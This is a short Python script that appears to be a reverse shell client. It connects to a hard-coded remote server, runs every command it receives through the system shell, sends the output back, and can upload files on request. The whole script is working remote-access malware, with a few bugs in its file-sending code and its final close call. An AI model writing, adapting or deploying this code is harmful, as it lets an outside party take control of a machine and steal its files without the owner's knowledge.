import socket
import os
import subprocess
import time

soc = socket.socket()
host = "192.168.225.207"				#IP of the server(host)
port = 5050
soc.connect((host,port))	#connecting to a server

while True:
	data = soc.recv(1024)
	if data[:2].decode('utf-8') == 'cd':
		os.chdir(data[3:].decode('utf-8'))
	if data[:4].decode('utf-8') == 'send':
		fhand = open(data[5:].decode('utf-8'))
		buff_size = str(len(fhand.read()))
		buff_size = '.'*(len(buff_size)-64)
		soc.send(buff_size.encode('utf-8'))
		for line in fhand:
			print(line)
			soc.send(line.encode('utf-8'))
		print(f"File {data[5:].decode('utf-8')} sent")	
	if len(data) > 0 and data[:4].decode('utf-8') != 'send':
		cmd = subprocess.Popen(data[:].decode('utf-8'), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
		# takes any output and sends it to standard stream (to the server)
		output_bytes = cmd.stdout.read() +  cmd.stderr.read()
		output_str = str(output_bytes, "utf-8")
		soc.send(str.encode(output_str + str(os.getcwd()) + '> '))		#returns the current working directory
		print(output_str)

#Close connection
s.close()		









